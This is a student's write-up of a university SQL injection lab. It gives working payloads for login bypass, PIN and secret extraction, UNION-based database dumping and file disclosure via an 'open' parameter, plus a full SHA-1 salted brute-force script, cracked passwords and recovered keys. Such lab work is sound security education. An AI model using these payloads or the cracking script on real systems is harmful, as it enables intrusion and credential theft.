# My solution of the SQL Injection Assignment

See [the assignment here](./SQL-Injection-Assignment.md).


## Task 1

First, I entered Username `endlemar` and password `'XXX`.

Luckily, the app returned a page with an error message:

```
Wrong SQL query: SELECT username FROM users WHERE username = 'endlemar' AND password = SHA1(CONCAT(''XXX', (SELECT salt FROM users WHERE username = 'endlemar')))
```

Seeing the whole query and the position of my “password” `'XXX`, I constructed the following value for `password` that
will result one row where username is `endlemar`:

```
')) OR 1 = 1 AND username = 'endlemar' -- 
```

**Note 1:** There is a trailing space in `-- `.

**Note 2:** The entered Username in the form does not affect the result of the SQL query when using this SQL injection.


## Task 2

Using the Hint #1 (Table `users` contains column `pin`), I constructed several queries (passwords) to find out what my
4-digits PIN is.

First, I found out that my PIN contains only digits 1, 3, 5, 7 using the queries in the following form (where `<number>`
is 0,..,9).

```
')) OR 1 = 1 AND username = 'endlemar' AND pin LIKE '%<number>%' -- 
```

That meant that there is only `4! = 16` possible PINs. However, I constructed additional queries to find out the digits'
relative precedence to each other (the condition evaluated to TRUE when `<i>` preceded `<j>`).

```
')) OR 1 = 1 AND username = 'endlemar' AND pin LIKE '%<i>%<j>%' -- 
```

Reducing the possible number of permutations this way, I quickly discovered that my PIN is `5371`.


## Task 3

Using the following query (password), I found out my secret is `E5XVZ2XDHS4SNGE2`:

```
')) AND 1 = 0 UNION SELECT secret FROM users WHERE username = 'endlemar' -- 
```

Once I had the secret, I used the Google Authenticator mobile app to generate the corresponding OTPs
(by manually creating a new account using the secret as “a setup key”).

The generated OTPs worked and I got in.

### Side note

Originally, I wanted to use this technique (with UNION) to find out my PIN. But it turns out that the app
must have some built-in protection against it:

```
')) AND 1 = 0 UNION SELECT pin FROM users WHERE username = 'endlemar' -- 
```

It seems that even though the SQL query succeeds and returns one username, the app checks whether the returned value is
from the user's table columns `username` and/or `secret`.

The following works:

```
')) AND 1 = 0 UNION SELECT 'endlemar' as username -- 
')) AND 1 = 0 UNION SELECT 'E5XVZ2XDHS4SNGE2' as username -- 
```

But the following does NOT work:

```
')) AND 1 = 0 UNION SELECT '5371' as username -- 
')) AND 1 = 0 UNION SELECT 'something' as username -- 
```


## Task 4

Once I successfully logged in, I started exploring the UI and all its features.
I noticed the link “Warning!” which led to the URL `https://kbe.felk.cvut.cz/index.php?open=warning.txt`.
Almost immediately, I tried replacing `warning.txt` with `index.php`.
And to my pleasant surprise, the server responded with a highlighted source code of the index.php.
After a quick look, I confirmed it must be the same index.php that is actually running on the server.

**Note 3:** In fact, no login is needed to access https://kbe.felk.cvut.cz/index.php?open=index.php.

**Note 4:** The code (line 67) confirms my suspicions from [Task 3's Side note](#side-note).

The next feature I noticed was the pagination mechanism of messages which was using the `offset` query parameter.
By looking into the code, I quickly constructed such offset values that helped me obtain the names of the database
tables, their column names and their data:

```
0 UNION SELECT table_name, 1 FROM information_schema.tables
0 UNION SELECT column_name, 1 FROM information_schema.columns WHERE table_name = 'users'
0 UNION SELECT column_name, 1 FROM information_schema.columns WHERE table_name = 'messages'
0 UNION SELECT column_name, 1 FROM information_schema.columns WHERE table_name = 'codes'

0 UNION SELECT CONCAT(username, '\t', password, '\t', pin, '\t', secret, '\t', salt), 1 FROM users
0 UNION SELECT CONCAT(username, '\t', base64_message_xor_key, '\t', date_time), 1 FROM messages
0 UNION SELECT CONCAT(username, '\t', aes_encrypt_code), 1 FROM codes
```

The database has 3 tables _(apart from the MySQL system tables)_ with the following columns:

* users
	* username
	* password
	* pin
	* secret
	* salt
* messages
	* username
	* base64_message_xor_key
	* date_time
* codes
	* username
	* aes_encrypt_code

The tables contain the following data:

* users – 8 rows – [users.tsv](./users.tsv)
* messages – 24 rows – [messages.tsv](./messages.tsv)
* codes – 9 rows – [codes.tsv](./codes.tsv)


## Task 5

Based on the task's description, I implemented the [sha1_bruteforce.py](./sha1_bruteforce.py) script in Python 3.

Below, you can find the script's source code:

```python
import argparse
import hashlib
import sys
from string import ascii_lowercase, digits
from itertools import product
from typing import Optional, Collection


DEFAULT_ALPHABET = digits + ascii_lowercase


def crack_sha1(hex_digest: str, length: int, salt: str, alphabet: Collection[str]) -> Optional[str]:
	assert len(hex_digest) == hashlib.sha1().digest_size * 2
	n = len(alphabet) ** length
	i = 0
	matching_password = None
	print(f'length={length} alphabet ({len(alphabet)}) = {alphabet}', file=sys.stderr)
	print(f'num possible password n = {len(alphabet)}^{length} = {n}', file=sys.stderr)
	for comb in product(alphabet, repeat=length):
		i += 1
		password = ''.join(comb)
		# print(password)
		data = password + salt
		raw_data = data.encode('utf-8')
		m = hashlib.sha1()
		m.update(raw_data)
		if m.hexdigest() == hex_digest:
			matching_password = password
			break
	print(f'tried i={i} passwords out of n={n} possible', file=sys.stderr)
	return matching_password


if __name__ == '__main__':
	parser = argparse.ArgumentParser(
		description='Crack an SHA-1 password hash using brute force.',
	)
	parser.add_argument(
		'--hash',
		help='The SHA-1 password hash (40 lowercase hex characters)',
		required=True,
	)
	parser.add_argument(
		'--length',
		help='The length of the password',
		required=True,
		type=int,
	)
	parser.add_argument(
		'--salt',
		help='Optional known password suffix salt, i.e., hash = sha1(password + salt)',
		default='',
	)
	parser.add_argument(
		'--alphabet',
		help='The password alphabet',
		default=DEFAULT_ALPHABET,
	)
	args = parser.parse_args()
	cracked_password = crack_sha1(
		hex_digest=args.hash,
		length=args.length,
		salt=args.salt,
		alphabet=args.alphabet,
	)
	if cracked_password is None:
		print('No SHA-1 digest match found!', file=sys.stderr)
		sys.exit(1)
	else:
		print(cracked_password)
```

In order to crack my password, I used the script like this:

```
$ python3 sha1_bruteforce.py --hash 61f85462c63e4b80cce4cd707e85a1bf55f23ca0 --length 5 --salt ecde9
length=5 alphabet (36) = 0123456789abcdefghijklmnopqrstuvwxyz
num possible password n = 36^5 = 60466176
tried i=15316431 passwords out of n=60466176 possible
94a8e
```

My cracked password without the salt is `94a8e`.
I tried logging in with my credentials (`endlemar` / `94a8e`) and it worked.


## Task 6

I used the online tool available at https://www.dcode.fr/sha1-hash to crack the salted password SHA-1
hash `2d55131b6752f066ee2cc57ba8bf781b4376be85` (with the known salt `kckct`) of the user with username `jaroslav`.

The cracked password without the salt is `fm9fytmf7q` (`fm9fytmf7qkckct` with the salt).


## Task 7

The teacher's password `fm9fytmf7q`, a seemingly random string, is insecure because it appears in some online SHA-1
reverse dictionaries. The reason is that the string `fm9fytmf7q`
is [apparently](https://gist.github.com/denizssch/72ec2aa1c5d0a84ffb57076f7dbf30d6)
part of a leaked Microsoft Windows XP serial number `FM9FY - TMF7Q - ...`.


## Task 8

See my solution of [Task 4](#task-4).


## Task 9

By having my messages (username `endlemar`) in both forms – decrypted (read from the web app after successful login) and
base64-encoded XOR-encrypted (`base64_message_xor_key` extracted from the database in [Task 4](#task-4)), I just simply
XORed both representations (and appropriately base64-decoded) to get the XOR key.

The following table provides the detailed data:

|                                message                                 |                                  base64_message_xor_key                                  |        base64_decode(base64_message_xor_key) XOR message         |
|------------------------------------------------------------------------|------------------------------------------------------------------------------------------|------------------------------------------------------------------|
| Welcome &lt;b>endlemar&lt;/b>, this is your first secret message.      | PAcJPA5ZA0JjGlEXMQ8JHDJTQg4dCVxJfxVcDxF/ERxSJgQQC39UWUBBH0IWOgJGAxZ/FQoBLAoCHHE=         | kbe_a4fb_xor_key_2022kbe_a4fb_xor_key_2022kbe_a4fb_xor_key_      |
| &lt;a href='index.php?code'>Here&lt;/a> you can find your secure code. | VwNFNxNRAF94EQEWOhNLCTdCD1FdDwdCYSlRFAdjVw5MfxIKDH9RUVwSDQsLO0FNCRctWBwXPB4XHH9RX1ZXRQ== | kbe_a4fb_xor_key_2022kbe_a4fb_xor_key_2022kbe_a4fb_xor_key_2022k |
| Well, that's all for now. Stay tuned for the next challenges.          | PAcJM00UEgo+DEgBfwoJFX9UX0ASBQ0ScUFnEgMmWBsHMQ4BWTldQhJGAwdFMQRMEkI8EA4eMw4LHjpBHg==     | kbe_a4fb_xor_key_2022kbe_a4fb_xor_key_2022kbe_a4fb_xor_key_20    |

From the 3rd column (`base64_decode(base64_message_xor_key) XOR message`), I figured out that my XOR key
is `kbe_a4fb_xor_key_2022`.

**Note 5:** For the Base64 decoding and XORing the data,
I used the online tool [CyberChef](https://gchq.github.io/CyberChef/).
[Here is the link](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)XOR(%7B'option':'UTF8','string':'Welcome%20%3Cb%3Eendlemar%3C/b%3E,%20this%20is%20your%20first%20secret%20message.'%7D,'Standard',false)&input=UEFjSlBBNVpBMEpqR2xFWE1ROEpIREpUUWc0ZENWeEpmeFZjRHhGL0VSeFNKZ1FRQzM5VVdVQkJIMElXT2dKR0F4Wi9GUW9CTEFvQ0hIRT0)
for the exact recipe with the data (1st message).

**Note 6:** Since I have got the index.php's source code, I could also directly find out my XOR key by
evaluating `xor_key('endlemar')`. Just for fun, I tried that in the PHP interactive shell (see below),
and I got the same result.

```
$ php -a
Interactive shell

php > function xor_key($username, $pattern = "kbe_REPLACE_xor_key_2022", $len = 4) {
php {     return str_replace("REPLACE", substr(sha1($username . $pattern), 0, $len), $pattern);
php { }
php > echo xor_key('endlemar');
kbe_a4fb_xor_key_2022
php > 
```


## Task 10

One of the messages (the 2nd) provides a link to `https://kbe.felk.cvut.cz/index.php?code` titled “Here you can find
your secure code.”. However, the server's response to the standard GET request (while a user is logged in) is **empty**.

I looked into the source code of index.php and located the corresponding part that handles these requests:

```php
if (isset($_GET["code"], $_SESSION["username"], $_SESSION["logged"])) {
    $code = q("SELECT AES_DECRYPT(UNHEX(aes_encrypt_code), '" . e(AES_ENCRYPT_CODE_KEY) . "') AS code FROM codes WHERE username = '" . e($_SESSION["username"]) . "'")->fetch_assoc()["code"];
    echo($code);
    exit();
}
```

From the code above, it seems that the server is supposed to print the currently-logged-in user's secure code.
However, the secure codes (`aes_encrypt_code`) in the `codes` table are apparently AES-encrypted.
The code constructs a SQL SELECT query that uses MySQL function
[`AES_DECRYPT(crypt_str, key_str)`](https://dev.mysql.com/doc/refman/8.0/en/encryption-functions.html#function_aes-decrypt)
to perform AES decryption on the database side. The code populates the AES key (`key_str` argument) with the value of
the `AES_ENCRYPT_CODE_KEY` constant, which is defined on line 19 (and on line 18, there is a commented out value):

```php
//define("AES_ENCRYPT_CODE_KEY", "iHw35UKAPaSYKf8SI44CwYPa");
define("AES_ENCRYPT_CODE_KEY", "ebMHfcrRJn3EE1r8SHZ3Gv6N");
```

Nevertheless, it seems that the AES encryption with the given key fails and nothing (i.e., `NULL`) is returned back to
the PHP code. That is probably the reason why `echo($code);` does not print anything and therefore the response to the
GET request `https://kbe.felk.cvut.cz/index.php?code` has zero content length.

I don't know if this is an expected behavior or if there is some problem with this task.


## Task 11

There is a row with the following values in the `codes` table.

```
username	aes_encrypt_code
rehakmar	685CC663AF312DB6085966BC5DFACBECC941FFD90BA8EE46A96F020AF47CBF21
```

I assume that's the encrypted Martin Rehak's secure code.
However, I don't know how to decrypt it.
